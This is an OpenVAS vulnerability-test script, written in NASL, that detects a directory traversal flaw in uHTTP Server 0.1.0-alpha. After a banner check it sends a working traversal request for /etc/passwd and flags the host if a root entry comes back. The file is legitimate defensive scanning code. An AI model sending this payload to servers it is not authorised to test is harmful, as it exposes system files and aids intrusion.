###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_uHTTP_38986.nasl 8469 2018-01-19 07:58:21Z teissa $
#
# uHTTP Server GET Request Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "uHTTP Server is prone to a directory-traversal vulnerability because
it fails to sufficiently sanitize user-supplied input.

Exploiting this issue will allow an attacker to view arbitrary local
files and directories within the context of the webserver. Information
harvested may aid in launching further attacks.

uHTTP Server 0.1.0-alpha is vulnerable; other versions may also
be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100560");
 script_version("$Revision: 8469 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-19 08:58:21 +0100 (Fri, 19 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-03-30 12:13:57 +0200 (Tue, 30 Mar 2010)");
 script_bugtraq_id(38986);
 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");

 script_name("uHTTP Server GET Request Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/38986");
 script_xref(name : "URL" , value : "http://uhttps.sourceforge.net");
 script_xref(name : "URL" , value : "http://www.salvatorefresta.net/files/adv/uhttp%20Server%200.1.0%20alpha%20Path%20Traversal%20Vulnerability-10032010.txt");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web Servers");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_require_ports("Services/www", 8080);
 script_mandatory_keys("uhttps/banner");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8080);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port: port);
if(!banner)exit(0);
if("Server: uhttps" >!< banner)exit(0);

soc = open_sock_tcp(port);
if(!soc)exit(0);

req = string("GET /../../../../../../etc/passwd HTTP/1.0\r\n\r\n");
send(socket:soc, data:req);
buf = recv(socket:soc, length:2048);
close(soc);

if( egrep(pattern: "root:.*:0:[01]:", string: buf, icase: TRUE) ) {
  security_message(port:port);
  exit(0); 
}

exit(0);
